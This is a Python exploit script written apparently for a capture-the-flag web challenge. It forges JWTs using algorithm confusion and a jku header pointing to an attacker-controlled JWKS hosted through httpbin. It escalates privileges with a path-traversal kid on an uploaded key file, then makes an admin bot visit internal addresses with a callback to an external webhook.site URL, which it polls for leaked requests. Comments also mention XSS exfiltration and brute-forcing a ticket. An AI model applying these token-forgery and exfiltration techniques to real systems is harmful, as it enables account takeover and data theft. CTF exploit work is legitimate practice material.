#!/usr/bin/env python3
"""Debug the bot - test if it visits URLs and can reach external services"""
import base64
import hashlib
import hmac
import json
import re
import time
import urllib.parse

import requests

TARGET = "http://chall.0xfun.org:59544"
HMAC_KEY = "mysecretkey"


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def forge_jwt(key, payload, header_extra=None):
    header = {"alg": "RS256", "typ": "JWT"}
    if header_extra:
        header.update(header_extra)
    h = b64url_encode(json.dumps(header, separators=(',', ':')).encode())
    p = b64url_encode(json.dumps(payload, separators=(',', ':')).encode())
    signing_input = f"{h}.{p}".encode()
    k = key if isinstance(key, bytes) else key.encode()
    sig = hmac.new(k, signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"


def make_jku_url():
    jwks = json.dumps({"keys": [{"kid": "partner-main", "k": HMAC_KEY}]})
    b64 = base64.b64encode(jwks.encode()).decode()
    return f"https://httpbin.org/base64/{urllib.parse.quote(b64, safe='')}"


def login_and_escalate():
    s = requests.Session()
    jku_url = make_jku_url()
    now = int(time.time())
    token = forge_jwt(HMAC_KEY, {
        "sub": "researcher", "email": "nora.vale@drift.com", "name": "Nora Vale",
        "iss": "https://sso.partner.local", "aud": "perimeter-drift-web",
        "exp": now + 3600, "iat": now
    }, {"kid": "partner-main", "jku": jku_url})
    s.get(f"{TARGET}/sso/callback", params={"id_token": token}, allow_redirects=True)

    # Escalate
    known_key = b"DEBUG_KEY"
    files = {"file": ("debug.pem", known_key, "application/octet-stream")}
    r = s.post(f"{TARGET}/review/material/upload", files=files)
    fname = r.json().get("filename", "debug.pem")
    kid_name = fname.rsplit(".pem", 1)[0] if fname.endswith(".pem") else fname
    grant = forge_jwt(known_key, {"scope": "report:submit", "iat": now},
                      {"kid": f"../review-materials/{kid_name}"})
    s.post(f"{TARGET}/review/escalate", data={"grant": grant}, allow_redirects=True)

    me = s.get(f"{TARGET}/api/me").json()
    print(f"Logged in as: {me['username']} (role: {me['role']})")
    return s


def submit_url(s, url):
    r = s.post(f"{TARGET}/report", data={"url": url}, allow_redirects=True)
    # Check for flash messages
    if "queued" in r.text.lower():
        return "queued"
    elif "rejected" in r.text.lower():
        return "rejected"
    elif "unavailable" in r.text.lower():
        return "unavailable"
    else:
        return f"unknown ({r.status_code})"


def main():
    print(f"Target: {TARGET}")

    # Create webhook
    print("\nCreating webhook.site token...")
    wr = requests.post("https://webhook.site/token", timeout=10)
    wh_data = wr.json()
    wh_uuid = wh_data["uuid"]
    wh_url = f"https://webhook.site/{wh_uuid}"
    print(f"Webhook: {wh_url}")

    s = login_and_escalate()

    # Test 1: Direct webhook URL - test if bot has internet access
    print("\n--- Test 1: Direct webhook URL ---")
    status = submit_url(s, f"{wh_url}/test-direct")
    print(f"  Status: {status}")

    # Test 2: Admin bounce with different target bases
    print("\n--- Test 2: Admin bounce ---")
    targets = [
        "http://web:5000",
        "http://host.docker.internal:5000",
        "http://host.docker.internal:59544",
        "http://localhost:5000",
        "http://127.0.0.1:5000",
        "http://perimeter-drift-web:5000",  # container name
    ]
    for tb in targets:
        url = f"{tb}/admin?bounce=1&cb={urllib.parse.quote(wh_url, safe='')}"
        status = submit_url(s, url)
        print(f"  {tb}: {status}")

    # Test 3: Try profile page with XSS to exfil via fetch
    # Test 4: Try using the bot's session to directly check /admin
    print("\n--- Test 3: Bot visit to admin directly ---")
    for tb in targets:
        url = f"{tb}/admin"
        status = submit_url(s, url)
        print(f"  {tb}: {status}")

    # Poll webhook for ANY requests
    print(f"\nPolling webhook for ANY requests (25s)...")
    for i in range(12):
        time.sleep(2)
        try:
            r = requests.get(f"https://webhook.site/token/{wh_uuid}/requests", timeout=10)
            if r.status_code == 200:
                data = r.json()
                total = data.get("total", 0)
                if total > 0:
                    print(f"\n  GOT {total} requests!")
                    for req in data.get("data", []):
                        print(f"    Method: {req.get('method', '?')}")
                        print(f"    URL: {req.get('url', '?')}")
                        print(f"    Query: {req.get('query', {})}")
                        print(f"    Headers: {json.dumps(dict(req.get('headers', {})), indent=2)[:500]}")
                        print()
                    return data
        except Exception as e:
            print(f"  Poll error: {e}")
        if (i+1) % 5 == 0:
            print(f"  Still waiting... ({(i+1)*2}s)")

    print("\n  No requests received on webhook. Bot likely can't reach external URLs.")

    # If no external access, try same-origin approach
    # Try brute-forcing the bootstrap ticket
    print("\n--- Trying bootstrap ticket brute-force ---")
    print("  Ticket format: bt-XXXX (4 hex chars, 65536 possibilities)")
    print("  This would take too long via bot submissions.")
    print("  Looking for alternative approaches...")

    return None


if __name__ == "__main__":
    main()
